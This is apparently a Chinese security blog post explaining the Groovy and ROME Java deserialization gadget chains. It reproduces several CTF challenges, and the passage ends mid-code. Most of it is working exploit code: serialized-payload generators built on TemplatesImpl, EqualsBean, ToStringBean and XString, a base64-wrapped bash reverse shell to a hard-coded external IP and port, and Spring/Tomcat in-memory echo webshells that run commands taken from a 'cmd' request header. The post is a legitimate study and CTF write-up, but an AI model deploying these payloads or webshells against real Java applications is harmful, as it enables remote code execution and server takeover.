title: java反序列化之Groovy、Rome链
author: bmth
top_img: 'https://img-blog.csdnimg.cn/d68f924326414681b005259bc344b33d.png'
cover: 'https://img-blog.csdnimg.cn/d68f924326414681b005259bc344b33d.png'
tags:
  - 反序列化
categories:
  - java
date: 2022-03-11 15:56:27
---
![](https://img-blog.csdnimg.cn/d68f924326414681b005259bc344b33d.png)
## Groovy
Groovy 是一种基于 JVM 的开发语言，具有类似于 Python，Ruby，Perl 和 Smalltalk 的功能。Groovy 既可以用作 Java 平台的编程语言，也可以用作脚本语言。groovy 编译之后生成 .class 文件，与 Java 编译生成的无异，因此可以在 JVM 上运行

### 前置知识
首先maven导入Groovy
```
<dependency>
	<groupId>org.codehaus.groovy</groupId>
	<artifactId>groovy-all</artifactId>
	<version>2.4.3</version>
</dependency>
```
我们就可以新建Groovy脚本和类了
![](https://img-blog.csdnimg.cn/9384e361c8ba4bc983eb31018e5f3df5.png)
#### MethodClosure
`org.codehaus.groovy.runtime.MethodClosure`是方法闭包，使用闭包代表了一个对象的一个方法，可以很方便的调用
`MethodClosure`初始化时接收两个参数，第一个参数是对象，第二个参数是对象的方法
![](https://img-blog.csdnimg.cn/10e7dfc3ceb14522854557c82d950169.png)
MethodClosure 中有一个 doCall 方法，调用`InvokerHelper.invokeMethod()`方法进行方法调用
![](https://img-blog.csdnimg.cn/d6c70325221c40159d86fd42f56f9414.png)
这样就可以使用 MethodClosure 执行系统命令：
```java
package Groovy;

import org.codehaus.groovy.runtime.MethodClosure;

import java.lang.reflect.Method;

public class Groovy {
    public static void main(String[] args) throws Exception{

        MethodClosure mc = new MethodClosure(Runtime.getRuntime(), "exec");
        Method m = MethodClosure.class.getDeclaredMethod("doCall", Object.class);
        m.setAccessible(true);
        m.invoke(mc, "calc");
    }
}
```
#### String.execute() 方法
Groovy 为 String 类型添加了 execute() 方法，以便执行 shell 命令，这个方法会返回一个 Process 对象。也就是说，在 Groovy 中，可以直接使用`"ls".execute()`这种方法来执行系统命令![](https://img-blog.csdnimg.cn/63e23698c373417baee232c467c5e85e.png)
POC变通形式：
```java
// 直接命令执行
Runtime.getRuntime().exec("calc")
"calc".execute()
'calc'.execute()
"${"calc".execute()}"
"${'calc'.execute()}"

// 回显型命令执行
println "cmd /c dir".execute().text
println 'whoami'.execute().text
println "${"whoami".execute().text}"
println "${'whoami'.execute().text}"
def cmd = "whoami";
println "${cmd.execute().text}";
```

实际上就是调用`Runtime.getRuntime().exec()`方法执行系统命令
![](https://img-blog.csdnimg.cn/183981fe1209460585d4963726483aed.png)
在 Java 中，就可以直接写做：
```java
MethodClosure methodClosure = new MethodClosure("calc", "execute");
methodClosure.call();
```
![](https://img-blog.csdnimg.cn/631dd330cba7439cb1e2889601c6c8c8.png)
#### ConvertedClosure
`org.codehaus.groovy.runtime.ConvertedClosure`是一个通用适配器，用于将闭包适配到 Java 接口
ConvertedClosure 实现了 ConversionHandler 类，而 ConversionHandler 又实现了 InvocationHandler，所以说 ConvertedClosure 本身就是一个动态代理类

如果初始化时指定的 method 与`invokeCustom`指定的 method 参数相同，则`invokeCustom`方法将会调用代理对象 Closure 的 call 方法执行传入参数执行
![](https://img-blog.csdnimg.cn/30ef93b65d914f73a0435b45dfc05066.png)
### 攻击构造
>依赖版本
Groovy : 1.7.0-2.4.3

AnnotationInvocationHandler 反序列化时调用 memberValues 中存放对象的 entrySet 对象，这个对象是 ConvertedClosure，而这个对象又实际上是 MethodClosure 对象的代理，定义了在调用 entrySet 方法时会调用 invoke 方法去调用 MethodClosure 的 call 方法，触发 Groovy 中 String 类型的 execute 方法执行命令
```java
package Groovy;

import org.codehaus.groovy.runtime.ConvertedClosure;
import org.codehaus.groovy.runtime.MethodClosure;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Map;

public class Groovy1 {
    public static void main(String[] args) throws Exception{
        //封装我们需要执行的对象
        MethodClosure methodClosure = new MethodClosure("calc", "execute");
        ConvertedClosure closure = new ConvertedClosure(methodClosure, "entrySet");

        Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = c.getDeclaredConstructors()[0];
        constructor.setAccessible(true);

        // 创建 ConvertedClosure 的动态代理类实例
        Map handler = (Map) Proxy.newProxyInstance(ConvertedClosure.class.getClassLoader(), new Class[]{Map.class}, closure);

        // 使用动态代理初始化 AnnotationInvocationHandler
        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, handler);

        try{
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./Groovy"));
            outputStream.writeObject(invocationHandler);
            outputStream.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./Groovy"));
            inputStream.readObject();
        }catch(Exception e){
            e.printStackTrace();
        }
    }
}
```

调用链：
```
AnnotationInvocationHandler.readObject()
    Map.entrySet() (Proxy)
        ConversionHandler.invoke()
            ConvertedClosure.invokeCustom()
		        MethodClosure.call()
                    ProcessGroovyMethods.execute()
```

参考：
[从Jenkins RCE看Groovy代码注入](https://xz.aliyun.com/t/8231)
[Java安全-Groovy](https://xz.aliyun.com/t/10703)
[ysoserial Java 反序列化系列第一集 Groovy1 ](https://www.anquanke.com/post/id/202730)

## Rome
ROME 是一个可以兼容多种格式的 feeds 解析器，可以从一种格式转换成另一种格式，也可返回指定格式或 Java 对象，Rome是为RSS聚合而开发的开源包，它可以支持0.91、0.92、0.93、0.94、1.0、2.0，可以说rss的版本基本上都支持了
下载地址：[https://rometools.github.io/rome/ROMEReleases/ROME1.0Release.html](https://rometools.github.io/rome/ROMEReleases/ROME1.0Release.html)
### 前置知识
#### ObjectBean
`com.sun.syndication.feed.impl.ObjectBean`是 Rome 提供的一个封装类型，初始化时提供了一个 Class 类型和一个 Object 对象实例进行封装
![](https://img-blog.csdnimg.cn/1f329ce1a1064fa2af6d10cdb7d9db55.png)
ObjectBean 也是使用委托模式设计的类，其中有三个成员变量，分别是 EqualsBean/ToStringBean/CloneableBean 类，这三个类为 ObjectBean 提供了 equals、toString、clone 以及 hashCode 方法

看一下 ObjectBean 的`hashCode`方法，会调用 EqualsBean 的`beanHashCode`方法
![](https://img-blog.csdnimg.cn/5d1e9f79e3e24c02b37f08925f54dc89.png)
会调用 EqualsBean 中保存的`_obj`的`toString()`方法
![](https://img-blog.csdnimg.cn/58239d92c84744188793a82ef3bbb845.png)
而这个`toString()`方法也就是触发利用链的地方，继 BadAttributeValueExpException 之后的另一个使用`toString()`方法触发利用的链

#### ToStringBean
`com.sun.syndication.feed.impl.ToStringBean`类从名字可以看出，这个类给对象提供 toString 方法，类中有两个 toString 方法，第一个是无参的方法，获取调用链中上一个类或`_obj`属性中保存对象的类名，并调用第二个 toString 方法
![](https://img-blog.csdnimg.cn/5ff395f35e8b4be7a9d9967d80c2d028.png)
第二个 toString 方法会调用`BeanIntrospector.getPropertyDescriptors()`来获取`_beanClass`的全部 getter/setter 方法，然后判断参数长度为 0 的方法，获取对应的Method，如果它是无参的就使用`_obj`实例进行反射调用
意思就是会调用所有 getter 方法拿到全部属性值，然后打印出来
![](https://img-blog.csdnimg.cn/22f45971bc394d929231d4ffa090567b.png)
由此可见，ToStringBean 的`toString()`方法可以触发其中`_obj`实例的全部 getter 方法，可以用来触发 TemplatesImpl 的利用链，调用TemplatesImpl的`getOutputProperties`进行动态加载字节码来实现命令执行

#### EqualsBean
在EqualsBean 里，存在与ToStringBean相似的利用，beanEquals 方法
![](https://img-blog.csdnimg.cn/ff375f1a4b874a23a2d545106df12d1e.png)
这样可以反射调用getter方法，可以发现equals 方法调用了 beanEquals方法
![](https://img-blog.csdnimg.cn/fb56c2e3ec0540e4957472d305317c38.png)

### 攻击构造
>依赖版本
rome : 1.0


利用 HashMap 反序列化触发 ObjectBean 的 hashCode 方法，再触发 ObjectBean 封装的 ObjectBean 的 toString 方法
```java
package rome;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;
import javassist.ClassPool;
import javassist.CtClass;

import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;

public class Rome {
    public static void main(String[] args) throws Exception {

        // 生成包含恶意类字节码的 TemplatesImpl 类
        // 读取恶意类 bytes[]
        String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
        ClassPool classPool=ClassPool.getDefault();
        classPool.appendClassPath(AbstractTranslet);
        CtClass payload=classPool.makeClass("rome1");
        payload.setSuperclass(classPool.get(AbstractTranslet));
        payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");");
        byte[] bytes=payload.toBytecode();

        // 初始化 TemplatesImpl 对象
        TemplatesImpl tmpl = new TemplatesImpl();
        Field bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(tmpl, new byte[][]{bytes});
        // _name 不能为空
        Field name = TemplatesImpl.class.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(tmpl, "name");

        // 使用 TemplatesImpl 初始化被包装类，使其 ToStringBean 也使用 TemplatesImpl 初始化
        ObjectBean delegate = new ObjectBean(Templates.class, tmpl);

        // 使用 ObjectBean 封装这个类，使其在调用 hashCode 时会调用 ObjectBean 的 toString
        // 先封装一个无害的类
        ObjectBean root = new ObjectBean(ObjectBean.class, new ObjectBean(String.class, "test"));

        // 放入 Map 中
        HashMap<Object, Object> map = new HashMap<>();
        map.put(root, "test");
        map.put("test", "test");

        // put 到 map 之后再反射写进去，避免触发漏洞
        Field field = ObjectBean.class.getDeclaredField("_equalsBean");
        field.setAccessible(true);
        field.set(root, new EqualsBean(ObjectBean.class, delegate));

        try{
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./rome"));
            outputStream.writeObject(map);
            outputStream.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./rome"));
            inputStream.readObject();
        }catch(Exception e){
            e.printStackTrace();
        }
    }

}
```
调用链：
```
 * TemplatesImpl.getOutputProperties()
 * NativeMethodAccessorImpl.invoke0(Method, Object, Object[])
 * NativeMethodAccessorImpl.invoke(Object, Object[])
 * DelegatingMethodAccessorImpl.invoke(Object, Object[])
 * Method.invoke(Object, Object...)
 * ToStringBean.toString(String)
 * ToStringBean.toString()
 * ObjectBean.toString()
 * EqualsBean.beanHashCode()
 * ObjectBean.hashCode()
 * HashMap<K,V>.hash(Object)
 * HashMap<K,V>.readObject(ObjectInputStream)
```

参考：
[Java 反序列化漏洞（五） - ROME/BeanShell/C3P0/Clojure/Click/Vaadin](https://su18.org/post/ysoserial-su18-5/)
[ROME 反序列化分析](https://c014.cn/blog/java/ROME/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html)



### 赛题复现
#### [D^3CTF]shorter
最近比赛出的一道java rome链反序列化题，这里复现一下
![](https://img-blog.csdnimg.cn/7c8c08796b26486b84e36a139e14bce5.png)
存在`baseStr.length() >= 1956`，而我们可以看一下通过ysoserial自带的链的长度
![](https://img-blog.csdnimg.cn/d59585b26d2845f9b2e807bf93b2e089.png)
很明显长了，那么需要缩短链长度，找到EqualsBean这条链，在cc7里的`Hashtable#reconstitutionPut`，有使用到equals方法
![](https://img-blog.csdnimg.cn/fa1599a00e634216862702b0568aa2e1.png)
在这里触发equals方法的，hash表中需要根据hash值来插入，如果要比较，需要满足两个对象的hash值相等
```java
    public int hashCode() {
        int h = hash;
        if (h == 0 && value.length > 0) {
            char val[] = value;

            for (int i = 0; i < value.length; i++) {
                h = 31 * h + val[i];
            }
            hash = h;
        }
        return h;
    }
```
第⼀个元素如果比第⼆个元素小1，第⼆个元素就必须比第⼀个元素大31，保证两个值的hash相等
HashMap的equals方法当中，当对象大于1时会转而调用类`java.util.AbstractMap#equals `
![](https://img-blog.csdnimg.cn/048103126daa4c62aa4a0f81ee50ed8e.png)
可以很明显看到这里调用了`value.equals`，这里value是遍历当前HashMap对象的值，m是比较的对象
![](https://img-blog.csdnimg.cn/f52098a1536d4e6d99d0cc302af221af.png)
此时不仅需要满足`value`为`EqualsBean`对象，还需要`m.get(key)`是一个TemplateImpl 对象
把两个map的value颠倒⼀下就可以了，即：`("aa"=>bean.equals("aa"=>templates))`
最后的payload：
```java
package rome;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import javassist.ClassPool;
import javassist.CtClass;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Hashtable;

public class RomeSer2 {
    public static void setFieldValue(Object obj,String fieldname,Object value)throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(obj,value);
    }
    public static void main(String[] args) throws Exception{
//        String cmd = "bash -i >& /dev/tcp/110.42.134.160/6666 0>&1";
        String cmd = "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTAuNDIuMTM0LjE2MC82NjY2IDA+JjE=}|{base64,-d}|{bash,-i}";

        //TemplateImpl 动态加载字节码
        String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
        ClassPool classPool=ClassPool.getDefault();
        classPool.appendClassPath(AbstractTranslet);
        CtClass payload=classPool.makeClass("a");
        payload.setSuperclass(classPool.get(AbstractTranslet));
//        payload.makeClassInitializer().setBody("Runtime.getRuntime().exec(new String[]{\"/bin/bash\", \"-c\", \""+cmd+"\"});");
        payload.makeClassInitializer().setBody("Runtime.getRuntime().exec(\""+cmd+"\");");
        byte[] code=payload.toBytecode();

        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj,"_name","a");
        setFieldValue(obj,"_class",null);
        setFieldValue(obj,"_bytecodes",new byte[][]{code});

        EqualsBean bean = new EqualsBean(String.class,"a");

        HashMap map1 = new HashMap();
        HashMap map2 = new HashMap();
        map1.put("yy",bean);
        map1.put("zZ",obj);
        map2.put("zZ",bean);
        map2.put("yy",obj);
        Hashtable table = new Hashtable();
        table.put(map1,"1");
        table.put(map2,"2");

        setFieldValue(bean,"_beanClass",Templates.class);
        setFieldValue(bean,"_obj",obj);

        //序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(table);
        oos.close();
        System.out.println(new String(Base64.getEncoder().encode(baos.toByteArray())));
        System.out.println(new String(Base64.getEncoder().encode(baos.toByteArray())).length());

        //反序列化
//        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
//        ObjectInputStream ois = new ObjectInputStream(bais);
//        ois.readObject();
//        ois.close();
    }
}
```
发现长度变为1552，短了许多
![](https://img-blog.csdnimg.cn/901190b847554e8c9dee9dc4cdf735e7.png)
并且成功执行反弹shell命令
![](https://img-blog.csdnimg.cn/ca2bc9c22da9468d8e0e40367643c297.png)

参考：
[d3ctf wp汇总 ](https://syclover.notion.site/d3ctf-wp-6f6993806bbe4291828fe74de0223500)

#### [陇原战"疫"2021]EasyJaba
>不出网

首先查看代码，发现存在一个后门
![](https://img-blog.csdnimg.cn/0392a41ba65d45cc86d0e40b62c58c0f.png)
传一个ctf，进行base64解密，然后使用黑名单过滤掉了`HashMap`和`BadAttributeValueExpException`，最后`readObject()`触发反序列化
发现存在Rome1.0，并且后面直接调用了toString方法，我们直接使用前面的链子就行了
ezjaba.java：
```java
package rome;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.ObjectBean;
import javassist.ClassPool;

import javax.xml.transform.Templates;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;

public class ezjaba {
    public static void main(String[] args) throws Exception{
        //不出网，加载恶意类的方式
        byte[][] evilCode=new byte[][]{ClassPool.getDefault().get(EvilTemplate.class.getName()).toBytecode()};

        // 实例化类并设置属性
        TemplatesImpl tmpl = new TemplatesImpl();
        Field fieldByteCodes = tmpl.getClass().getDeclaredField("_bytecodes");
        fieldByteCodes.setAccessible(true);
        fieldByteCodes.set(tmpl, evilCode);

        Field fieldName = tmpl.getClass().getDeclaredField("_name");
        fieldName.setAccessible(true);
        fieldName.set(tmpl, "a");

        ObjectBean objectBean1 = new ObjectBean(Templates.class, tmpl);
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream out = new ObjectOutputStream(byteArrayOutputStream);
        out.writeObject(objectBean1);
        byte[] s = byteArrayOutputStream.toByteArray();
        out.close();
        String exp = Base64.getEncoder().encodeToString(s);
        System.out.println(exp);

    }
}
```
回显马参考：[https://github.com/SummerSec/JavaLearnVulnerability/blob/master/Rce_Echo/TomcatEcho/src/main/java/summersec/echo/Controller/SpringEcho.java](https://github.com/SummerSec/JavaLearnVulnerability/blob/master/Rce_Echo/TomcatEcho/src/main/java/summersec/echo/Controller/SpringEcho.java)
EvilTemplate.java：
```java
package rome;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import java.io.*;
import java.lang.reflect.Method;
import java.util.Scanner;

public class EvilTemplate extends AbstractTranslet implements Serializable {
    public EvilTemplate() throws Exception{
        Class c = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.RequestContextHolder");
        Method m = c.getMethod("getRequestAttributes");
        Object o = m.invoke(null);
        c = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.ServletRequestAttributes");
        m = c.getMethod("getResponse");
        Method m1 = c.getMethod("getRequest");
        Object resp = m.invoke(o);
        Object req = m1.invoke(o); // HttpServletRequest
        Method getWriter = Thread.currentThread().getContextClassLoader().loadClass("javax.servlet.ServletResponse").getDeclaredMethod("getWriter");
        Method getHeader = Thread.currentThread().getContextClassLoader().loadClass("javax.servlet.http.HttpServletRequest").getDeclaredMethod("getHeader",String.class);
        getHeader.setAccessible(true);
        getWriter.setAccessible(true);
        Object writer = getWriter.invoke(resp);
        String cmd = (String)getHeader.invoke(req, "cmd");
        String[] commands = new String[3];
        String charsetName = System.getProperty("os.name").toLowerCase().contains("window") ? "GBK":"UTF-8";
        if (System.getProperty("os.name").toUpperCase().contains("WIN")) {
            commands[0] = "cmd";
            commands[1] = "/c";
        } else {
            commands[0] = "/bin/sh";
            commands[1] = "-c";
        }
        commands[2] = cmd;
        writer.getClass().getDeclaredMethod("println", String.class).invoke(writer, new Scanner(Runtime.getRuntime().exec(commands).getInputStream(),charsetName).useDelimiter("\\A").next());
        writer.getClass().getDeclaredMethod("flush").invoke(writer);
        writer.getClass().getDeclaredMethod("close").invoke(writer);
    }

    @Override
    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws com.sun.org.apache.xalan.internal.xsltc.TransletException {
    }
    @Override
    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, com.sun.org.apache.xml.internal.serializer.SerializationHandler handler) throws com.sun.org.apache.xalan.internal.xsltc.TransletException {

    }
}
```
还可以使用Tomcat回显，回显代码参考：[https://github.com/feihong-cs/Java-Rce-Echo](https://github.com/feihong-cs/Java-Rce-Echo)
Evil.java：
```java
package rome;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;

public class Evil extends AbstractTranslet{
    public Evil() throws Exception {
        boolean flag = false;
        ThreadGroup group = Thread.currentThread().getThreadGroup();
        java.lang.reflect.Field f = group.getClass().getDeclaredField("threads");
        f.setAccessible(true);
        Thread[] threads = (Thread[]) f.get(group);

        for(int i = 0; i < threads.length; i++) {
            try{
                Thread t = threads[i];
                if (t == null) continue;
                String str = t.getName();
                if (str.contains("exec") || !str.contains("http")) continue;
                f = t.getClass().getDeclaredField("target");
                f.setAccessible(true);
                Object obj = f.get(t);
                if (!(obj instanceof Runnable)) continue;
                f = obj.getClass().getDeclaredField("this$0");
                f.setAccessible(true);
                obj = f.get(obj);
                try{
                    f = obj.getClass().getDeclaredField("handler");
                }catch (NoSuchFieldException e){
                    f = obj.getClass().getSuperclass().getSuperclass().getDeclaredField("handler");
                }
                f.setAccessible(true);
                obj = f.get(obj);
                try{
                    f = obj.getClass().getSuperclass().getDeclaredField("global");
                }catch(NoSuchFieldException e){
                    f = obj.getClass().getDeclaredField("global");
                }
                f.setAccessible(true);
                obj = f.get(obj);

                f = obj.getClass().getDeclaredField("processors");
                f.setAccessible(true);
                java.util.List processors = (java.util.List)(f.get(obj));

                for(int j = 0; j < processors.size(); ++j) {
                    Object processor = processors.get(j);
                    f = processor.getClass().getDeclaredField("req");
                    f.setAccessible(true);
                    Object req = f.get(processor);
                    Object resp = req.getClass().getMethod("getResponse", new Class[0]).invoke(req, new Object[0]);

                    str = (String)req.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(req, new Object[]{"cmd"});

                    if (str != null && !str.isEmpty()) {
                        resp.getClass().getMethod("setStatus", new Class[]{int.class}).invoke(resp, new Object[]{new Integer(200)});
                        String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", str} : new String[]{"/bin/sh", "-c", str};
                        byte[] result = (new java.util.Scanner((new ProcessBuilder(cmds)).start().getInputStream())).useDelimiter("\\A").next().getBytes();
                        try {
                            Class cls = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
                            obj = cls.newInstance();
                            cls.getDeclaredMethod("setBytes", new Class[]{byte[].class, int.class, int.class}).invoke(obj, new Object[]{result, new Integer(0), new Integer(result.length)});
                            resp.getClass().getMethod("doWrite", new Class[]{cls}).invoke(resp, new Object[]{obj});
                        } catch (NoSuchMethodException var5) {
                            Class cls = Class.forName("java.nio.ByteBuffer");
                            obj = cls.getDeclaredMethod("wrap", new Class[]{byte[].class}).invoke(cls, new Object[]{result});
                            resp.getClass().getMethod("doWrite", new Class[]{cls}).invoke(resp, new Object[]{obj});
                        }
                        flag = true;
                    }
                    if (flag) break;
                }
                if (flag)  break;
            }catch(Exception e){
                continue;
            }
        }
    }
    @Override
    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws com.sun.org.apache.xalan.internal.xsltc.TransletException {

    }

    @Override
    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, com.sun.org.apache.xml.internal.serializer.SerializationHandler handler) throws com.sun.org.apache.xalan.internal.xsltc.TransletException {

    }
}
```
将得到的exp进行urlencode，然后传入得到flag
![](https://img-blog.csdnimg.cn/499a214c90b9483983c815e67dcedd56.png)
参考：
[ctf中的java题目学习2](https://tttang.com/archive/1352)
[陇原战疫2021网络安全大赛 Web](https://blog.csdn.net/rfrder/article/details/121203831)

#### [长城杯2022]b4bycoffee
发现反序列化，并且存在rome1.7.0
![](https://img-blog.csdnimg.cn/20da2380cff14f288d41ab423f224b86.png)
但这个反序列化ban掉了rome链最常用的ToStringBean、ObjectBean、BadAttributeValueExpException，那怎么调用到tostring()呢?
![](https://img-blog.csdnimg.cn/dc18593bdb8949f280c92adeec9726fd.png)
rome链不是还存在一个EqualsBean吗，那么思路就很清晰了，但又过滤了TemplatesImpl，不能直接加载恶意类了

继续跟进发现存在CoffeeBean类，该类继承了ClassLoader，所以可以直接动态加载字节码，并且在`toString()`方法中，看到了`defineClass()`，之后try中又有个newInstance()，所以只要控制ClassByte的值，就可以任意代码执行

![](https://img-blog.csdnimg.cn/03aeda123d494525ad5e574ed945507b.png)
exp：
```java
import com.example.b4bycoffee.model.CoffeeBean;
import com.example.b4bycoffee.tools.AntObjectInputStream;
import com.rometools.rome.feed.impl.EqualsBean;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;
import java.util.Hashtable;

public class exploit {
    public static void setFieldValue(Object obj,String fieldname,Object value)throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(obj,value);
    }
    public static void main(String[] args) throws Exception{
        CoffeeBean toStringBean = new CoffeeBean();
        Class c = toStringBean.getClass();
        Field classByteField = c.getDeclaredField("ClassByte");
        classByteField.setAccessible(true);
        byte[] bytes = Files.readAllBytes(Paths.get("C:\\Users\\bmth\\Desktop\\作业\\CTF学习\\java学习\\反序列化\\out\\production\\反序列化\\SpringEcho.class"));
        classByteField.set(toStringBean,bytes);

        EqualsBean bean = new EqualsBean(String.class,"a");

        HashMap map1 = new HashMap();
        HashMap map2 = new HashMap();
        map1.put("yy",bean);
        map1.put("zZ",toStringBean);
        map2.put("zZ",bean);
        map2.put("yy",toStringBean);
        Hashtable table = new Hashtable();
        table.put(map1,"1");
        table.put(map2,"2");

        setFieldValue(bean,"beanClass",CoffeeBean.class);
        setFieldValue(bean,"obj",toStringBean);

        //序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(table);
        oos.close();
        System.out.println(new String(Base64.getEncoder().encode(baos.toByteArray())));

//        InputStream inputStream = new ByteArrayInputStream(Base64.getDecoder().decode(new String(Base64.getEncoder().encode(baos.toByteArray()))));
//        AntObjectInputStream antInputStream = new AntObjectInputStream(inputStream);
//        antInputStream.readObject();
    }
}
```
加载Spring回显类即可，注意这里传参方式是`@RequestBody CoffeeRequest coffee`，需要使用json传
![](https://img-blog.csdnimg.cn/0f4c4f4f7e1449c1b26007b81a48ed56.png)

#### [2022安洵杯]ezjaba
拿到源码可以发现存在rome-1.7.0，postgresql-42.3.1，mysql-connector-java-8.0.12 那么很明显就是打rome链了
![](https://img-blog.csdnimg.cn/f40285f0343f46afb394f16bfdf15eee.png)

继续跟进可以发现重写了resolveClass
![](https://img-blog.csdnimg.cn/00219cfb0259413cbd27ac7cadf8dd4c.png)

可以发现没有ban掉`ToStringBean`，而`ToStringBean`可以调用getter方法，说明我们需要找一个方法来调用到toString方法
具体可参考：[Java代码分析工具Tabby在CTF中的运用](https://mp.weixin.qq.com/s/u7RuSmBHy76R7_PqL8WJww)
可以看到给出了一条链
```
java.util.HashMap#readObject
java.util.HashMap#putVal
java.lang.Object#equals
com.sun.org.apache.xpath.internal.objects.XString#equals
```

可以看到HashMap的putVal方法调用了`key.equals(k)`
![](https://img-blog.csdnimg.cn/987faf75dabd47099751d70e570ebd19.png)

使用的是XString的equals方法
![](https://img-blog.csdnimg.cn/62effc16e92044c5b2c9cf3a68f4ba50.png)

但是前提是需要HashMap中key值的hashcode相同，找到`org.springframework.aop.target.HotSwappableTargetSource`类
![](https://img-blog.csdnimg.cn/53fde14c5bf14033943ae0b1ee1dde39.png)

使用HotSwappableTargetSource的hashcode方法时，返回的是相同的hashcode


最后的payload：
```java
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import javassist.ClassPool;
import org.springframework.aop.target.HotSwappableTargetSource;
import tools.Evil;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;

public class Rome_XString {
    public static void setFieldValue(Object obj,String fieldname,Object value)throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(obj,value);
    }
    public static HashMap makeXStringToStringTrigger(Object o) throws Exception {
        XString x = new XString("HEYO");
        return makeMap(new HotSwappableTargetSource(o), new HotSwappableTargetSource(x));
    }
    public static HashMap<Object, Object> makeMap (Object v1, Object v2 ) throws Exception {
        HashMap<Object, Object> s = new HashMap<>();
        setFieldValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        setFieldValue(s, "table", tbl);
        return s;
    }
    public static void main(String[] args) throws Exception{

        byte[] bytes = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();

        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][]{bytes});
        setFieldValue(templatesImpl, "_name", "a");
        setFieldValue(templatesImpl, "_tfactory", null);

        ToStringBean bean = new ToStringBean(Templates.class,templatesImpl);
        HashMap gadgetChain = makeXStringToStringTrigger(bean);

//        XString x = new XString("HEYO");
//        HashMap map1 = new HashMap();
//        HashMap map2 = new HashMap();
//        map1.put("aa",bean);
//        map1.put("bB",x);
//        map2.put("aa",x);
//        map2.put("bB",bean);
